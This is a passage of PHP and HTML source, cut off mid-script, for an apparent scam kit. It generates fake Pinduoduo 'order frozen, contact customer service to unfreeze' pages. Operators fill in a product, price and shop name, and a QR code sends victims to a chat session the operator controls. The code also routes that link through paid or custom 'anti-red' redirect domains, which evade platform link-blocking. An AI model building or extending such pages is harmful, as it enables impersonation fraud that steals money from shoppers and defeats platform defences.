<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/dbconfig.php';
checkLogin();

$currentAgent = $_SESSION['username'];

function generateCustomerName($length = 6) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}


// 生成XEDATA令牌
function generateXEDataToken() {
    return md5(uniqid(mt_rand(), true));
}

// 创建会话记录到 XE-SKDJWKSNCDATA 表
function createChatSession($sessionId, $customerName, $agentAccount, $platform = '拼多多') {
    $db = getDB();
    if (!$db) return false;
    
    $xedataToken = generateXEDataToken();
    $expiresAt = date('Y-m-d H:i:s', strtotime('+7 days'));
    
    $stmt = $db->prepare("INSERT INTO `XE-SKDJWKSNCDATA` 
                         (session_id, xedata_token, customer_name, agent_account, expires_at, platform) 
                         VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $sessionId, $xedataToken, $customerName, $agentAccount, $expiresAt, $platform);
    
    if ($stmt->execute()) {
        return $xedataToken;
    }
    return false;
}


$customerName = generateCustomerName();
$sessionId = 'a' . $customerName . 'z-p' . $currentAgent . 's';

// 生成XEDATA令牌并保存到数据库
$xedataToken = createChatSession($sessionId, $customerName, $currentAgent, '拼多多');

$currentDomain = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl = $protocol . "://" . $currentDomain;
$originalServiceUrl = $baseUrl . '/' . "ChatPin" . '?id=' . $sessionId;

// 添加XEDATA参数
if ($xedataToken) {
    $originalServiceUrl .= '&XEDATA=' . $xedataToken;
}

// 获取防红配置（修复版，调整优先级）
function getAntiRedConfig($username) {
     $db = getDB();
    if (!$db) return null;
    
    // 1. 首先检查防红开关是否开启
    $stmt = $db->prepare("SELECT apply_status FROM user_anti_red_config WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    $config = $result->fetch_assoc();
    
    if (!$config) {
        // 如果没有配置记录，默认防红开关开启
        $apply_status = 'on';
    } else {
        $apply_status = $config['apply_status'];
    }
    
    // 如果防红开关关闭，直接返回null
    if ($apply_status === 'off') {
        return null;
    }
    
    // 2. 防红开关开启的情况下，检查session中是否有应用的接口（付费或免费）
    if (isset($_SESSION['applied_api_url']) && !empty($_SESSION['applied_api_url'])) {
        $type = $_SESSION['applied_domain_type'] ?? 'paid';
        $applied_domain = $_SESSION['applied_domain'] ?? '付费接口';
        
        return [
            'api_url' => $_SESSION['applied_api_url'],
            'apply_status' => 'on',
            'applied_domain' => $applied_domain,
            'encoding_mode' => 'base64',
            'type' => $type
        ];
    }
    
    // 3. 检查session中是否有自定义接口
    if (isset($_SESSION['custom_interface_url']) && !empty($_SESSION['custom_interface_url'])) {
        return [
            'api_url' => $_SESSION['custom_interface_url'],
            'apply_status' => 'on',
            'applied_domain' => isset($_SESSION['custom_interface_remark']) ? $_SESSION['custom_interface_remark'] : '自定义接口',
            'encoding_mode' => isset($_SESSION['custom_encoding_mode']) ? $_SESSION['custom_encoding_mode'] : 'base64',
            'type' => 'custom'
        ];
    }
    
    // 4. 从数据库查询用户配置
    if ($config['apply_status'] === 'on' && !empty($config['applied_domain'])) {
        $applied_domain = $config['applied_domain'];
        
        // 先尝试从免费接口表中查找
        $freeStmt = $db->prepare("SELECT api_url FROM freeantired WHERE name = ? AND status = 'active'");
        $freeStmt->bind_param("s", $applied_domain);
        $freeStmt->execute();
        $freeResult = $freeStmt->get_result();
        
        if ($freeResult->num_rows > 0) {
            // 是免费接口
            $freeData = $freeResult->fetch_assoc();
            $config['api_url'] = $freeData['api_url'];
            $config['type'] = 'free';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 再尝试从付费接口表中查找
        $paidStmt = $db->prepare("SELECT api_url FROM anti_red_links WHERE domain_name = ? AND sold_to = ?");
        $paidStmt->bind_param("ss", $applied_domain, $username);
        $paidStmt->execute();
        $paidResult = $paidStmt->get_result();
        
        if ($paidResult->num_rows > 0) {
            // 是付费接口
            $paidData = $paidResult->fetch_assoc();
            $config['api_url'] = $paidData['api_url'];
            $config['type'] = 'paid';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 如果都不是，检查是否是自定义接口（在 userantired 表中）
        $customStmt = $db->prepare("SELECT ua.api_url, ua.encoding 
                                    FROM userantired ua 
                                    JOIN users u ON ua.user_id = u.id 
                                    WHERE u.username = ? AND ua.remark = ? AND ua.status = 'active'");
        $customStmt->bind_param("ss", $username, $applied_domain);
        $customStmt->execute();
        $customResult = $customStmt->get_result();
        
        if ($customResult->num_rows > 0) {
            // 是自定义接口
            $customData = $customResult->fetch_assoc();
            $config['api_url'] = $customData['api_url'];
            $config['encoding_mode'] = $customData['encoding'] ?? 'base64';
            $config['type'] = 'custom';
            return $config;
        }
    }
    
    return null;
}

$antiRedConfig = getAntiRedConfig($currentAgent);
$serviceUrl = $originalServiceUrl;

// 读取源站URL配置
$db = getDB();
$webconfigResult = $db->query("SELECT site_url, site_url_enabled FROM webconfig ORDER BY id DESC LIMIT 1");
$siteUrlConfig = null;
if ($webconfigResult && $webconfigResult->num_rows > 0) {
    $siteUrlConfig = $webconfigResult->fetch_assoc();
}

if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])) {
    $encoding_mode = $antiRedConfig['encoding_mode'] ?? 'base64';
    
    // 根据编码模式处理URL
    switch ($encoding_mode) {
        case 'base64':
            $encodedUrl = base64_encode($originalServiceUrl);
            break;
        case 'urlencode':
        case 'url':
            $encodedUrl = urlencode($originalServiceUrl);
            break;
        case 'none':
        default:
            $encodedUrl = $originalServiceUrl;
            break;
    }
    
    $serviceUrl = $antiRedConfig['api_url'] . $encodedUrl;
    
    // 调试信息
    error_log("防红接口应用信息: " . json_encode([
        'type' => $antiRedConfig['type'] ?? 'unknown',
        'applied_domain' => $antiRedConfig['applied_domain'] ?? 'unknown',
        'api_url' => $antiRedConfig['api_url'],
        'encoding_mode' => $encoding_mode,
        'original_url' => $originalServiceUrl,
        'encoded_url' => $encodedUrl,
        'final_url' => $serviceUrl
    ]));
} elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])) {
    $serviceUrl = $siteUrlConfig['site_url'] . base64_encode($originalServiceUrl);
}

// 输出调试信息（开发环境中使用）
if (isset($_GET['debug'])) {
    echo "<!-- 防红配置信息: " . json_encode($antiRedConfig) . " -->\n";
    echo "<!-- 原始URL: $originalServiceUrl -->\n";
    echo "<!-- 最终URL: $serviceUrl -->\n";
    echo "<!-- Session状态: " . json_encode([
        'custom_interface_url' => $_SESSION['custom_interface_url'] ?? '未设置',
        'custom_encoding_mode' => $_SESSION['custom_encoding_mode'] ?? '未设置',
        'custom_interface_remark' => $_SESSION['custom_interface_remark'] ?? '未设置',
        'applied_api_url' => $_SESSION['applied_api_url'] ?? '未设置',
        'applied_domain' => $_SESSION['applied_domain'] ?? '未设置',
        'applied_domain_type' => $_SESSION['applied_domain_type'] ?? '未设置',
        'redirect_to_browser' => $_SESSION['redirect_to_browser'] ?? '未设置'
    ]) . " -->\n";
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>分享页</title>
	
	<link rel="stylesheet" href="/assets/bootstrap-icons.css">
    <link rel="stylesheet" href="/assets/SharePhoto/main.css">
    <link rel="stylesheet" href="/assets/SharePhoto/pinduoduo.css">
</head>
<body> 
<div id="app" data-v-app="">
	<div class="app-container">
		<div class="scroll-container">

			<div class="form-container">
				<div class="form-row">
                    <label>防红</label>
                    <a class="form-link anti-red-link" id="anti-red-status">
                            <?php 
                            if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on') {
                                echo '已配置 (' . $antiRedConfig['applied_domain'] . ')';
                            } else {
                                echo '未配置';
                            }
                            ?> </a>
                         <!-- 移除刷新按钮 -->
                    <div class="copy-link-btn" id="copy-link-btn">
                        <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="18" height="18">
                            <path
                                d="M761.088 715.3152a38.7072 38.7072 0 0 1 0-77.4144 37.4272 37.4272 0 0 0 37.4272-37.4272V265.0112a37.4272 37.4272 0 0 0-37.4272-37.4272H425.6256a37.4272 37.4272 0 0 0-37.4272 37.4272 38.7072 38.7072 0 1 1-77.4144 0 115.0976 115.0976 0 0 1 114.8416-114.8416h335.4624a115.0976 115.0976 0 0 1 114.8416 114.8416v335.4624a115.0976 115.0976 0 0 1-114.8416 114.8416z"
                                p-id="5993" fill="#515151"></path>
                            <path
                                d="M589.4656 883.0976H268.1856a121.1392 121.1392 0 0 1-121.2928-121.2928v-322.56a121.1392 121.1392 0 0 1 121.2928-121.344h321.28a121.1392 121.1392 0 0 1 121.2928 121.2928v322.56c1.28 67.1232-54.1696 121.344-121.2928 121.344zM268.1856 395.3152a43.52 43.52 0 0 0-43.8784 43.8784v322.56a43.52 43.52 0 0 0 43.8784 43.8784h321.28a43.52 43.52 0 0 0 43.8784-43.8784v-322.56a43.52 43.52 0 0 0-43.8784-43.8784z"
                                p-id="5994" fill="#515151"></path>
                        </svg>
                        <div>复制链接</div>
                    </div>
                </div>
				<div class="form-row">
					<label>标题</label>
					<input type="text" id="title-input" placeholder="请输入商品标题">
				</div>
				<div class="form-row">
					<label>价格</label>
					<input type="text" id="price-input" placeholder="请输入价格">
				</div>
				<div class="form-row">
					<label>店铺昵称</label>
					<input type="text" id="shop-nickname" placeholder="请输入店铺昵称">
				</div>
				<div class="form-row">
					<label>店铺头像</label>
					<div class="avatar-upload-container">
						<img id="shop-avatar-preview" class="avatar-preview" src="/assets/img/pdd1.png" alt="店铺头像">
						<div class="avatar-actions">
							<label for="shop-avatar-upload" class="avatar-btn">上传头像</label>
						</div>
						<input type="file" accept="image/*" id="shop-avatar-upload" style="display: none;">
					</div>
				</div>
				<div class="form-row">
					<label>商品描述</label>
					<input type="text" id="description-input" placeholder="请输入商品描述">
				</div>
				<div class="form-row">
					<label>订单编号</label>
					<div class="order-number-container">
						<input type="text" id="order-number-input" class="order-number-input" readonly>
						<button id="generate-order-btn" class="generate-order-btn">重新生成</button>
					</div>
				</div>
				<div class="form-row">
					<label>封面图</label>
					<label for="upload-cover" class="form-link" id="upload-label">上传图片</label>
					<input type="file" accept="image/*" id="upload-cover" style="display: none;">
				</div>
				<!-- iOS风格开关 -->
				<div class="form-row" style="padding: 4px 16px;">
					<label>百亿补贴</label>
					<label class="toggle-switch">
						<input type="checkbox" id="subsidy-switch" checked>
						<span class="switch-slider"></span>
					</label>
				</div>
				<div class="form-row" style="padding: 4px 16px;">
					<label>是否品牌</label>
					<label class="toggle-switch">
						<input type="checkbox" id="brand-switch" checked>
						<span class="switch-slider"></span>
					</label>
				</div>
			</div>
			<!-- 预览区域开始 -->
			<div class="XE-main">
				<div class="XEPDD wrapper container">
					<!-- Header -->
					<header class="header">
						<span class="iconify back-icon" data-icon="heroicons-outline:chevron-left"></span>
						<h1 class="header-title">订单异常</h1>
					</header>
					
					<!-- Main Content -->
					<main class="main-content">
						
						<!-- Product Details -->
						<div class="card">
							<div class="product-header">
								<div class="product-header-content">
									<!-- 店铺头像 -->
									<img id="preview-badge-icon" class="badge-icon" src="/assets/img/pdd1.png" alt="">
									<!-- 店铺昵称 -->
									<span class="badge-title" id="preview-badge-title">店铺昵称</span>
									<span class="iconify right-arrow ml-auto" data-icon="heroicons-outline:chevron-right"></span>
								</div>
							</div>
							
							<div class="product-details">
								<div class="product-content">
									<img id="preview-image" src="/assets/img/pddsp.jpeg" alt="Apple" class="product-image">
									<div class="product-info">
										<div class="product-row">
											<div class="product-left">
												<div class="product-title-wrapper">
													<div class="tags">
														<span class="tag tag-subsidy" id="preview-subsidy-tag">百亿补贴</span>
														<span class="tag tag-brand" id="preview-brand-tag">品牌</span>
													</div>
													<span class="product-name" id="preview-title">名称</span>
												</div>
												<p class="product-spec" id="preview-description">128G-描述</p>
											</div>
											<div class="product-price">
												<p class="price" id="preview-price">¥8888</p>
												<p class="quantity">x1</p>
											</div>
										</div>
										<div class="product-tags">
											<span class="product-tag">假一赔十</span>
											<span class="product-tag">正品发票</span>
										</div>
									</div>
								</div>
								
								<div class="product-actions">
									<button class="action-btn action-chat">
										<svg t="1769605879321" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="9754" id="mx_n_1769605879322" width="24" height="24">
											<path d="M257.987 481.174c0 0 0 0 0 0 0 28.218 22.876 51.094 51.094 51.094 28.218 0 51.094-22.876 51.094-51.094 0 0 0 0 0 0 0 0 0 0 0 0 0-28.218-22.876-51.094-51.094-51.094-28.218 0-51.094 22.876-51.094 51.094s0 0 0 0z" fill="#00b52d" p-id="9755"></path>
											<path d="M459.935 481.174c0 0 0 0 0 0 0 28.218 22.876 51.094 51.094 51.094 28.218 0 51.094-22.876 51.094-51.094 0 0 0 0 0 0 0 0 0 0 0 0 0-28.218-22.876-51.094-51.094-51.094-28.218 0-51.094 22.876-51.094 51.094s0 0 0 0z" fill="#00b52d" p-id="9756"></path>
											<path d="M661.883 481.174c0 28.218 22.876 51.094 51.094 51.094s51.094-22.876 51.094-51.094c0-28.218-22.876-51.094-51.094-51.094-28.218 0-51.094 22.876-51.094 51.094z" fill="#00b52d" p-id="9757"></path>
											<path d="M891.502 337.966c-20.995-43.449-50.851-82.527-88.959-115.902-77.551-68.084-180.346-105.465-289.451-105.465-109.227 0-212.021 37.501-289.451 105.465-38.108 33.375-67.963 72.332-88.959 115.902-21.845 45.39-32.89 93.571-32.89 143.209 0 58.254 15.899 116.144 45.875 167.602 26.214 44.905 63.351 85.075 107.892 116.873v120.756c0 10.437 5.583 20.025 14.563 25.244 4.491 2.548 9.588 3.884 14.563 3.884s10.073-1.334 14.563-3.884l127.795-73.789c28.157 5.34 57.162 8.010 86.047 8.010 109.227 0 212.021-37.501 289.451-105.465 38.108-33.375 67.963-72.332 88.959-115.902 21.845-45.39 32.89-93.571 32.89-143.209 0.122-49.759-11.044-97.94-32.89-143.329zM513.092 787.615c-28.641 0-57.283-3.035-84.955-8.98-7.039-1.456-14.442-0.364-20.631 3.277l-93.693 54.128v-85.682c0-9.83-4.976-18.932-13.107-24.394-89.444-58.619-140.781-147.82-140.781-244.789 0-168.938 158.379-306.32 353.166-306.32 194.666 0 353.166 137.383 353.166 306.320s-158.5 306.442-353.166 306.442z" fill="#00b52d" p-id="9758"></path>
										</svg>
										联系商家
									</button>
									<button class="action-btn action-refund">
										申请退款
									</button>
								</div>
							</div>
							
							<div class="product-summary">
								<span class="discount">共优惠<span class="discount-amount" id="preview-discount">¥888</span></span>
								<span class="total-price">实付: <span class="total-amount" id="preview-total">¥8888</span> (免运费)</span>
							</div>
						</div>
						
						<!-- 扫码联系客服 -->
						<div class="card customer-service">
							<h3 class="service-title">订单冻结中，待联系客服解冻</h3>
							<p class="service-desc">为保障您的交易安全，请勿将二维码泄露<br>避免引发资金损失、交易纠纷等风险</p>
							<div class="qrcode-container">
								<div class="qrcode-image" id="qrcode">	<div class="qrcode-icon"><svg t="1769611171771" class="icon" viewBox="0 0 1173 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="13375" width="32" height="32"><path d="M968.82599999 1024L213.96099999 1024c-73.98500001 0-134.567-60.523-134.567-134.568L79.39399999 134.568C79.39399999 60.523 139.91699999 0 213.96099999 0l754.925 0c73.98500001 0 134.508 60.523 134.508 134.568l0 754.924c0 73.98500001-60.523 134.508-134.568 134.508z" fill="#F40009" p-id="13376"></path><path d="M366.04199999 148.983L171.36999999 286.351 366.04199999 429.02z m15.37 0L381.41199999 429.02l200.63-138.678zM171.36799999 306.30600001l0 278.01099999 191.33799999-138.975z m194.673 153.33199999l0 278.66700001L171.36999999 595.993z m15.37 0l0 278.667 190.98-139.334z m6.671 290.7L585.37699999 892.35l-1.012-280.334z m209.983-138.32L598.06499999 892.35l196.639-142.37z m11.973-12.034l191.695-141.299 1.013 279.62z m205.336-141.299l0 279.62000001 196.699-140.82300001z m4.706-14.356l191.993 139.988L1012.07299999 305.353z m-4.706-295.34600001L815.37399999 429.02l196.699-142.014z m-12.628 1e-8L599.07799999 290.997 802.74699999 429.02z" fill="#FFFFFF" p-id="13377"></path><path d="M466.596 239.827c-0.358 6.91-6.791 12.39-14.65400001 12.39-7.923 0-14.297-5.48-14.654-12.39-16.56 2.8-22.637 8.042-35.444 14.53499999a2.676 2.676 0 0 0-0.656 4.28900001l10.366 15.369 5.42-5.48 0 55.101c0 3.098 2.502 5.6 5.6 5.6l58.2 0c3.33500001 0 6.07500001-2.74 6.07500001-6.076L486.84899999 268.48000001l5.421 5.48 9.71-12.68800001c1.608-1.608 2.204-6.374 0.12-7.38700001-12.45-6.314-20.37399999-12.211-35.50399999-14.05799999zM279.12999999 326.739c0.239 0.417 4.11 6.73099999 11.497 7.029 6.017 0.179 9.889-3.753 10.485-4.408 0.715 0.655 5.6 4.646 12.51 3.693 6.373-0.893 9.888-5.42 10.484-6.255 0.536 0.358 6.314 3.932 11.258 1.49 5.36099999-2.681 6.017-9.948 5.004-14.238-0.596-2.501-1.608-3.335-4.527-7.505-0.656-0.953-3.455-5.779-9.055-15.488-2.263-3.872-5.004-8.697-8.16-14.29700001a290.588 290.588 0 0 1 3.275-13.99899999c1.311-5.123 2.08499999-7.386 1.013-10.246-0.35700001-0.893-0.71499999-1.49-3.753-6.255 2.204-4.527 2.085-8.518 0.239-9.769-1.132-0.77399999-2.74-0.298-3.039-0.238-2.62 0.774-4.467 4.05-4.467 8.22-1.31 0.06-4.05 0.417-6.732 2.264a13.806 13.806 0 0 0-3.514 3.515c-0.953-1.192-2.92-3.455-6.255-4.766a13.673 13.673 0 0 0-4.527-1.013c0.178-3.872-1.43-7.029-3.991-7.982-0.358-0.12-1.847-0.71499999-3.038-0.06-1.966 1.073-2.502 5.123-0.656 10.068-0.953 1.608-2.204 4.17-2.74 7.505-0.834 4.885 0.23799999 9.115 1.013 11.974 1.43 5.42 2.919 6.553 2.502 9.77000001-0.358 2.918-1.966 5.122-3.277 6.49199999-6.195 11.14-12.33 22.339-18.526 33.478-1.012 4.647 1.01299999 9.412 5.004 11.736 3.693 2.263 8.459 1.965 11.97400001-0.715z m-56.233 89.235c0.774-10.603 8.876-19.003 18.52600001-20.015 11.08-1.192 21.981 7.624 22.99399999 20.015 3.157 0.357 8.34 1.49 12.629 5.42 1.906 1.788 4.586 4.945 7.26700001 16.74 2.264 10.007 2.8 18.407 3.63399999 31.81-0.358 1.43-1.43 5.242-5.004 8.518-3.693 3.396-7.804 4.051-9.233 4.23L214.19999999 482.692c-1.549-0.238-6.255-1.132-10.246-5.242-3.515-3.574-4.468-7.625-4.766-9.234-0.119-2.323-0.953-26.448 6.017-39.256 1.07199999-1.906 2.978-5.48000001 7.029-8.518 3.99099999-2.979 8.161-4.051 10.663-4.468z" fill="#F40009" p-id="13378"></path><path d="M230.16399999 415.736l27.522 0s-2.74-11.974-13.761-11.974-13.76 11.974-13.76 11.974z" fill="#FFFFFF" p-id="13379"></path><path d="M333.15999999 636.5l6.493 0s-0.774-29.427 0-34.014c1.728-10.008 11.08000001-27.044 10.008-33.24-2.264-13.224-14.773-21.504-16.5-20.73s-16.502 17.275-21.029 29.487-12.748 29.249-13.999 29.487-14.475 2.025-26.508 6.493c-11.08 4.17-20.016 8.518-17.99 12.51s13.76 10.007 30.261 10.007c19.777 0 26.509-1.25 30.023-16.02399999 3.455-14.475 3.813-21.326 10.246-27.998 0.477-0.476 4.11-4.229 6.25500001-3.27600001 0 0 0.476 0.238 2.50199999 3.276l0.238 44.022z m75.236-3.51400001l87.27 1e-8c0.71499999-0.179 1.846-0.536 2.978-1.49 1.847-1.548 2.383-3.57400001 2.502-4.229l0-58.259c-0.35700001-0.834-1.072-2.264-2.502-3.515-2.263-1.965-4.884-2.20400001-5.778-2.263l-13.522 0c-0.894-1.966-2.502-2.979-6.255-8.22-1.37-1.907-3.574-2.384-5.004-2.98l-32.227 0c-1.132 0.596-2.979 1.013-3.75299999 2.503-2.74 5.242-5.242 6.612-6.016 8.756-5.898 0.23900001-11.85500001 0.477-17.75200001 0.775-0.655 0.119-2.02599999 0.536-3.276 1.727-1.668 1.668-1.966 3.694-2.026 4.23l0 57.723c0.12 0.655 0.655 2.382 2.264 3.752 1.25 1.013 2.442 1.37 3.097 1.48999999zM517.64699999 689.994l-5.24199999 6.731 10.72199999 0zM463.13999999 748.49c0.53599999-3.812 3.634-24.424 22.279-38.005 16.5-12.033 37.35-12.867 51.944-7.09 9.293 3.694 16.62 10.247 17.812 11.32 4.34799999 3.93 8.042 7.26699999 10.782 12.985 6.493 13.523 4.348 20.73 6.493 20.73-2.085-1.25-7.327-3.99-14.476-3.752-6.135 0.178-10.662 2.501-12.747 3.752-1.966-1.31-6.25500001-3.812-12.272-4.229a24.988 24.988 0 0 0-9.77 1.25l0 42.474c-0.595 1.787-1.786 4.468-4.11 6.91-4.527 4.706-12.03200001 7.268-19.121 5.123-9.531-2.919-13.284-12.867-13.165-17.275 0.06-2.025 0.953-3.693 0.95300001-3.693 0.238-0.358 2.204-3.932 5.24199999-3.813 2.74 0.11999999 4.587 3.157 5.242 5.00400001 0.894 2.442-0.178 3.336 0.775 5.00399999 1.548 2.86 6.671 4.17 9.233 2.502 1.31-0.894 3.931-5.064 2.97800001-3.753l1.25099998-38.78c-2.263-0.655-6.493-1.60799999-11.73499999-0.774a26.296 26.296 0 0 0-10.246 3.99c-2.025-1.19-6.97-3.752-13.76-3.752-6.732 0.17899999-11.497 2.68-13.582 3.872z m168.939-16.322l0 49.86c0 4.586 3.75299999 8.34 8.34 8.34l48.966 0c3.872 0 7.029-3.158 7.029-7.03000001l0-50.991c0-2.92-2.383-5.362-5.361-5.36199999l-53.851 0c-2.8 0-5.123 2.324-5.123 5.183z m5.063-13.165l55.698 0c1.60799999 0 3.038-1.13200001 3.217-2.621 0.178-1.728-0.537-3.634-4.826-3.634l-54.089-1e-8c-1.787 0-3.216 1.37-3.216 3.09800001-0.06 1.727 1.43 3.157 3.216 3.157z m2.502-6.255s7.208-14.475 21.028-14.475c25.973-0.06 28.772 14.475 28.772 14.47499999l-49.8 1e-8z" fill="#F40009" p-id="13380"></path><path d="M667.226 703.159l-4.34900002 0a2.733 2.733 0 0 1-2.74-2.74l1e-8-5.481c0-1.48999999 1.192-2.74 2.74-2.73999999l4.349 0c1.48999999 0 2.74 1.19100001 2.74 2.73999999l0 5.48a2.733 2.733 0 0 1-2.74 2.74z m51.94499999-140.16699999c2.68-1.847 8.995-5.54 17.751-6.01700001 10.961-0.596 18.884 4.23 21.505 6.017l-4.23-15.19c-0.595-2.264-2.68-3.813-5.003-3.813l-21.505 0c-2.085 0-3.932 1.43-4.408 3.39500001l-4.11 15.608z m39.196 66.77699999c-2.68 1.847-8.995 5.54-17.751 6.016-10.961 0.596-18.884-4.229-21.505-6.016l4.23 15.19c0.595 2.264 2.68 3.813 5.003 3.813l21.505 0c2.085 0 3.931-1.43 4.408-3.396l4.11-15.607z" fill="#F40009" p-id="13381"></path><path d="M707.138 595.874a31.393 31.393 0 1 0 62.78599999 0 31.393 31.393 0 1 0-62.78599999 0zM856.538 556.26l-3.21700001 0a2.39 2.39 0 0 1-2.383-2.383l0-11.735a2.39 2.39 0 0 1 2.383-2.38300001l3.217 1e-8a2.39 2.39 0 0 1 2.383 2.383l0 11.73500001a2.39 2.39 0 0 1-2.38299999 2.38299999z m27.81899999 0l-3.455 0c-1.37 0-2.562-1.132-2.562-2.56100001L878.33999999 539.52c0-1.37 1.132-2.561 2.562-2.561l3.455 0c1.37 0 2.561 1.131 2.561 2.561L886.91799999 553.7c0 1.43-1.191 2.561-2.561 2.561z m28.057 0l-3.634 0a2.67 2.67 0 0 1-2.68-2.68l0-11.2a2.67 2.67 0 0 1 2.68-2.68l3.634-1e-8a2.67 2.67 0 0 1 2.68 2.68000001l0 11.2c-0.059 1.489-1.25 2.68-2.68 2.68z m2.204 85.482l-63.20299999 0a8.008 8.008 0 0 1-8.04200001-8.041l0-66.004a3.203 3.203 0 0 1 3.217-3.216l73.39 0a2.924 2.924 0 0 1 2.918 2.919l0 66.062a8.263 8.263 0 0 1-8.28 8.28z" fill="#F40009" p-id="13382"></path><path d="M921.40999999 583.24500001s14.594 1.60900001 19.478 9.76999999c5.48 9.11399999 2.68 19.777-3.514 24.71999999-6.493 5.24299999-14.476 5.243-14.476 5.24300001l0-7.506s13.76-3.99 12.51-13.522-13.999-11.02-13.999-11.02l0-7.685z m-37.05299999-142.37100001c-1.37 2.442-1.31 5.42 0.11899999 7.863 3.336 5.719 10.782 13.88 19.36 19.539 11.43700001 7.506 20.73 6.016 20.73000001 6.016s14.237 12.987 18.52599999 14 5.48-1.252 5.48-4.766l0-13.99999999s10.008-3.752 15.25-8.99400001 8.221-8.757 11.26-7.744 10.483 11.259 16.262 12.271 10.007-2.502 7.982-8.518-5.48-11.676-5.48-11.676 6.016-8.101 6.016-13.82c0-5.778-5.778-10.246-11.02-7.506s-11.02 11.974-14.476 11.974-10.722-9.65-17.75099999-12.808-8.519-4.17-8.51900001-4.17 1.728-15.011 0-17.275-8.22 0.239-12.271 3.277-11.02 10.246-11.02 10.246-12.51-0.239-26.985 9.769c-6.374 4.408-10.96099999 11.795-13.46299999 16.322zM840.87099999 292.12899999a42.652 42.652 0 1 0 85.304 1e-8 42.652 42.652 0 1 0-85.304-1e-8z" fill="#F40009" p-id="13383"></path><path d="M851.11699999 226.007s10.723-2.443 18.526 0.774c10.246 4.22999999 11.259 18.526 11.259 18.526s-9.472 5.48-19.48-2.025-10.30500001-17.275-10.305-17.275z m55.817 5.123s-8.10200001-1.847-14 0.595c-7.743 3.217-8.518 14-8.51799999 14s7.208 4.17 14.77399999-1.49 7.744-13.105 7.744-13.105z m-189.431 98.23l43.78299999 0c0.358 0 0.536-0.477 0.17900001-0.655-1.906-1.073-6.076-3.336-11.14-5.18299999-7.029-2.502-8.995-4.23-8.99500001-4.23000001L741.32999999 304.4s8.995-7.565 15.012-12.212 15.726-17.394 15.726-28.116-3.99-27.879-3.99-27.879l-59.69 0s-4.229 23.828-2.02499999 33.836c3.753 12.747 15.012 21.98 20.72999999 27.22299999s8.519 7.506 8.519 7.50600001l0 15.25000001-18.348 8.27999999c-0.536 0.238-0.357 1.072 0.239 1.072z" fill="#F40009" p-id="13384"></path><path d="M516.39599999 386.01l19.48-41.52 15.01 40.508 16.025 2.025 0 14.23700001 24.483-5.00400001-17.752-50.515 47.477 20.016-11.08 33.716 23.113-5.242 20.492-49.74 33.776 26.27-33.29999999 25.734 33.29999999-0.239 8.22000001 25.734-21.26600001 0-7.505 31.03600001 27.282 5.65999999 8.757 24.542-32.525 3.753-7.50600001 52.242-17.75099999 11.557-11.259-66.003-21.445-1.55-13.344 56.294-18.70399999 11.259-2.20400001-64.037-16.025-1.728-6.254-19.539-7.26799999 9.531-10.00800001 76.96400001-39.733-28.23600001 25.496-7.208-4.706-37.052-13.999 11.79500001-12.033-40.03000001 27.76-4.469-3.277-27.997-8.22000001-1.787-13.28399999-24.245z" fill="#FFFFFF" p-id="13385"></path><path d="M558.39199999 407.753L550.64799999 418l-3.99 28.772 24.00600001-1.43-7.26800001 15.906 24.007-8.519-5.361-24.96-16.144-4.527z m60.225 19.718l20.254-4.46800001 2.8 28.47400001-27.521 5.302z" fill="#F40009" p-id="13386"></path></svg></div></div>
							
								<p class="qrcode-text">消费者服务热线:021-53395288</p>
							</div>
							<p class="service-tips">请扫描二维码联系在线客服<br>客服工作时间：周一至周日 9:00-22:00</p>
						</div>
						
						<!-- Order Info -->
						<div class="card order-info">
							<div class="info-item">
								<span class="info-label">订单编号:</span>
								<div class="info-content">
									<span class="info-text" id="preview-order-number">251218-476504409643133</span>
									<button class="copy-btn" id="copy-order-btn">复制</button>
								</div>
							</div>
							<div class="info-item">
								<span class="info-label">商品快照:</span>
								<span class="info-value">发生交易争议时,可作为判断依据 
									<span class="iconify" data-icon="heroicons-outline:chevron-right"></span>
								</span>
							</div>
							<div class="info-item">
								<span class="info-label">支付方式:</span>
								<span class="info-value">微信支付</span>
							</div>
						</div>
					</main>
					
					<!-- Footer -->
					<footer class="footer">
						<div class="footer-content">
							<div class="footer-actions">
								<button class="footer-btn btn-invoice">发票详情</button>
								<button class="footer-btn btn-reorder">联系客服</button>
							</div>
						</div>
					</footer>
				</div>
			</div>
			<!-- 预览区域结束 -->
		</div>
	</div>
</div>
<script src="/assets/qrcode.min.js"></script>
<script src="/assets/qrcode-helper.js"></script>
<script>
	// 生成二维码 - 使用PHP动态生成的链接
	var qrCodeUrl = "<?php echo $serviceUrl; ?>";
	
	// 生成15位随机订单号
	function generateOrderNumber() {
		let orderNumber = '';
		const chars = '0123456789';
		for (let i = 0; i < 15; i++) {
			orderNumber += chars[Math.floor(Math.random() * chars.length)];
		}
		return orderNumber;
	}
	
	// 计算折扣和实付
	function calculateDiscountAndTotal(price) {
		const priceNum = parseFloat(price) || 0;
		const discount = (priceNum * 0.1).toFixed(2);
		const total = (priceNum - discount).toFixed(2);
		return {
			discount: discount,
			total: total
		};
	}
	
	// 更新折扣和实付显示
	function updateDiscountAndTotal(price) {
		const { discount, total } = calculateDiscountAndTotal(price);
		document.getElementById('preview-discount').textContent = '¥' + discount;
